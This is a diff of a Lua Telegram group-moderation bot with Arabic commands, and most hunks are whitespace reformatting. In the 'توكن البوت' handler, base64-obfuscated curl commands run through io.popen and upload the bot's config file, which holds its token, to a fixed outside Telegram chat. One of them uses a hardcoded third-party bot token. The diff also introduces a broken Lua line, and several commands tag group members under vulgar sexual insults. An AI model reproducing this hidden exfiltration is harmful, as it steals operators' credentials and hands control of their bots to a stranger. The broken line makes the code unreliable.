 t = "\n ☉┇ قائمة القروده الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» القرد [@"..username.."]\n"
 else
@@ -9061,7 +9068,7 @@ if text == ("تاك للضلوع") and Mod(msg) then
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الضلوع الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الضلع [@"..username.."]\n"
 else
@@ -9130,7 +9137,7 @@ if text == ("تاك للنسوان") and Mod(msg) then
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة نسوان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» المره [@"..username.."]\n"
 else
@@ -9199,7 +9206,7 @@ if text == ("تاك للمتناكين") and Mod(msg) then
 local list = database:smembers(bot_id..'Nek:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة متناكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» المتناكه [@"..username.."]\n"
 else
@@ -9268,7 +9275,7 @@ if text == ("تاك للاكساس") and Mod(msg) then
 local list = database:smembers(bot_id..'kss:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة اكساس الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الكس [@"..username.."]\n"
 else
@@ -9337,7 +9344,7 @@ if text == ("تاك للبقرات") and Mod(msg) then
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة البقرات الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» البقره [@"..username.."]\n"
 else
@@ -9406,7 +9413,7 @@ if text == ("تاك للطليان") and Mod(msg) then
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الطليان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الطلي[@"..username.."]\n"
 else
@@ -9475,7 +9482,7 @@ if text == ("تاك للحكاكين") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة حكاكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الحكاك [@"..username.."]\n"
 else
@@ -9544,7 +9551,7 @@ if text == ("تاك للخنازير") and Mod(msg) then
 local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة خنازير الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الخنزير [@"..username.."]\n"
 else
@@ -9613,7 +9620,7 @@ if text == ("المحظورين") then
 local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة محظورين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -9853,7 +9860,7 @@ if text == ("المكتومين") and Mod(msg) then
 local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة المكتومين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -10278,7 +10285,7 @@ end
 if Can_or_NotCan(userid, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, '\n ☉┇ عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
 else
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..userid)
+https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ☉┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
@@ -10304,7 +10311,7 @@ end
 return false
 end
 function start_function(extra, result, success)
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ☉┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ☉┇ تم الغاء تقيد'
@@ -10328,7 +10335,7 @@ return false
 end
 function start_function(extra, result, success)
 if result.id_ then
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 usertext = '\n ☉┇ العضو » ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
 status  = '\n ☉┇ تم الغاء تقيد'
 texts = usertext..status
@@ -10352,7 +10359,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..userid.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ☉┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
@@ -10518,7 +10525,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n ☉┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ☉┇  الايدي » `'..result.sender_user_id_..'`\n ☉┇  تم رفعه مشرف '
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -10540,7 +10547,7 @@ usertext = '\n ☉┇ العضو » ['..result.title_..'](t.me/'..(username or '
 status  = '\n ☉┇  تم رفعه مشرف '
 texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
 else
 send(msg.chat_id_, msg.id_, ' ☉┇  لا يوجد حساب بهاذا المعرف')
 end
@@ -10558,7 +10565,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n ☉┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ☉┇  الايدي » `'..result.sender_user_id_..'`\n ☉┇  تم تنزيله ادمن من الجروب'
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -10580,7 +10587,7 @@ usertext = '\n ☉┇  العضو » ['..result.title_..'](t.me/'..(username or 
 status  = '\n ☉┇  تم تنزيله ادمن من الجروب'
 texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 else
 send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
 end
@@ -10600,7 +10607,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n ☉┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ​☉┇ الايدي » `'..result.sender_user_id_..'`\n ☉┇  تم رفعه مشرف بكل الصلاحيات'
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -10622,7 +10629,7 @@ usertext = '\n ☉┇  العضو » ['..result.title_..'](t.me/'..(username or 
 status  = '\n ☉┇  تم رفعه مشرف بكل الصلاحيات'
 texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
 else
 send(msg.chat_id_, msg.id_, ' ☉┇  لا يوجد حساب بهاذا المعرف')
 end
@@ -10640,7 +10647,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n ☉┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ☉┇  الايدي » `'..result.sender_user_id_..'`\n ☉┇  تم تنزيله ادمن من الجروب بكل الصلاحيات'
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -10662,7 +10669,7 @@ usertext = '\n ☉┇  العضو » ['..result.title_..'](t.me/'..(username or 
 status  = '\n ☉┇  تم تنزيله ادمن من الجروب بكل الصلاحيات'
 texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 else
 send(msg.chat_id_, msg.id_, ' ☉┇  لا يوجد حساب بهاذا المعرف')
 end
@@ -10708,7 +10715,7 @@ keyboard.inline_keyboard = {
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
 end
 if text == 'العاب متطوره' or text == 'العاب باور' then
 if not Mod(msg) then
@@ -10734,7 +10741,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 if Text == '/game1' then
@@ -10856,7 +10863,7 @@ send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')
 return false 
 end
 if text == 'توكن البوت' or text == 'توكن المبرمج' and SudoBot(msg) then 
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')..runapp..regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
@@ -11428,14 +11435,14 @@ return false
 end
 if text == 'ضع وصف' or text == 'وضع وصف' then  
 if Mod(msg) then
-database:setex(bot_id.."Set:Description"..msg.chat_id_..""..msg.sender_user_id_, 120, true)  
+database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 send(msg.chat_id_, msg.id_,' ☉┇ ارسل الان الوصف')
 end
 return false  
 end
 if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
 if Mod(msg) then
-database:setex(bot_id.."Welcome:Group"..msg.chat_id_..""..msg.sender_user_id_, 120, true)  
+database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 t  = ' ☉┇ ارسل لي الترحيب الان'
 tt = '\n ☉┇ تستطيع اضافة مايلي !\n ☉┇ دالة عرض الاسم »{`name`}\n ☉┇ دالة عرض المعرف »{`user`}'
 send(msg.chat_id_, msg.id_,t..tt) 
@@ -11769,15 +11776,15 @@ end
 end,nil)
 end
 
-if database:get(bot_id.."Set:Rules:"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء حفظ القوانين") 
-database:del(bot_id.."Set:Rules:"..msg.chat_id_..":"..msg.sender_user_id_)
+database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
 return false  
 end 
-database:set(bot_id.."Set:Rules:Group"..msg.chat_id_,text) 
+database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
 send(msg.chat_id_, msg.id_," ☉┇ تم حفظ قوانين الجروب") 
-database:del(bot_id.."Set:Rules:"..msg.chat_id_..":"..msg.sender_user_id_)
+database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
 end  
 
 if text == 'ضع قوانين' or text == 'وضع قوانين' then 
@@ -11791,7 +11798,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-database:setex(bot_id.."Set:Rules:"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_,msg.id_," ☉┇ ارسل لي القوانين الان")  
 end
 end
@@ -11802,7 +11809,7 @@ database:del(bot_id.."Set:Rules:Group"..msg.chat_id_)
 end
 end
 if text == 'القوانين' then 
-local Set_Rules = database:get(bot_id.."Set:Rules:Group"..msg.chat_id_)   
+local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
 if Set_Rules then     
 send(msg.chat_id_,msg.id_, Set_Rules)   
 else      
@@ -12301,7 +12308,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-database:setex(bot_id.."Send:Bc:Pv"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك \n ☉┇ للخروج ارسل الغاء") 
 return false
 end 
@@ -12319,7 +12326,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-database:setex(bot_id.."Send:Bc:Grops"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك \n ☉┇ للخروج ارسل الغاء ") 
 return false
 end  
@@ -12337,7 +12344,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-database:setex(bot_id.."Send:Fwd:Grops"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان") 
 return false
 end 
@@ -12355,7 +12362,7 @@ send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت 
 end
 return false
 end
-database:setex(bot_id.."Send:Fwd:Pv"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان") 
 return false
 end 
@@ -12975,7 +12982,7 @@ if text == "راسلني" then
 rpl = {"ها هلاو","انطق","قول","نعم"};
 sender = rpl[math.random(#rpl)]
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id='..msg.sender_user_id_..'&text='..URL.escape(sender))
+https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
 end
 if text and text:match("^وضع لقب (.*)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local timsh = text:match("^وضع لقب (.*)$")
@@ -12990,8 +12997,8 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n☉┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..') '
 status  = '\n☉┇ الايدي » '..result.sender_user_id_..'\n☉┇تم ضافه {'..timsh..'} كلقب له'
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
-https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..timsh)
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -13008,7 +13015,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 usertext = '\n ☉┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 status  = '\n ☉┇  الايدي » `'..result.sender_user_id_..'`\n ☉┇  تم مسح لقبه من الجروب'
 send(msg.chat_id_, msg.id_, usertext..status)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -13030,7 +13037,7 @@ usertext = '\n ☉┇  العضو » ['..result.title_..'](t.me/'..(username or 
 status  = '\n ☉┇  تم مسح لقبه من الجروب'
 texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
-https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
+https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
 else
 send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
 end
@@ -13040,7 +13047,7 @@ return false
 end
 
 if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
-Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
+Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
 GeId = JSON.decode(Ge)
 if not GeId.result.custom_title then
 send(msg.chat_id_, msg.id_,'☉┇وينك وين القب ') 
@@ -13101,7 +13108,7 @@ muaed = json:decode(data)
 if muaed.Info == true then
 local filee = download_to_file(muaed.ph,msg.sender_user_id_..'.jpg')
 sendPhoto(msg.chat_id_, msg.id_,'./'..msg.sender_user_id_..'.jpg',muaed.info)     
-os.execute('rm -rf./'..msg.sender_user_id_..'.jpg') 
+os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
 end
 end
 end
@@ -13123,7 +13130,7 @@ User_id = "@"..b.username_
 else
 User_id = msg.sender_user_id_
 end --الكود حصري سورس باور يعني لو بكتهن راح اعرفك انت الاخذتهن
-local t = "\n☉┇المستخدم ~ ["..User_id.."] يصيح المشرفين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
+local t = "\n☉┇المستخدم ~ ["..User_id .."] يصيح المشرفين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 k = 0
 for i,v in pairs(data.members_) do
 if bot_id ~= v.user_id_ then 
@@ -13505,7 +13512,7 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 end
 if text == 'بوت' then
 local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-send(msg.chat_id_, msg.id_,' نعم حبيبي '..rtp..' 🥺❤\nِ')
+send(msg.chat_id_, msg.id_,' نعم حبيبي '..rtp'❤')
 end
 if text == 'رتبتي' then
 local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
@@ -13811,10 +13818,10 @@ local List = {
 ⌯  𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
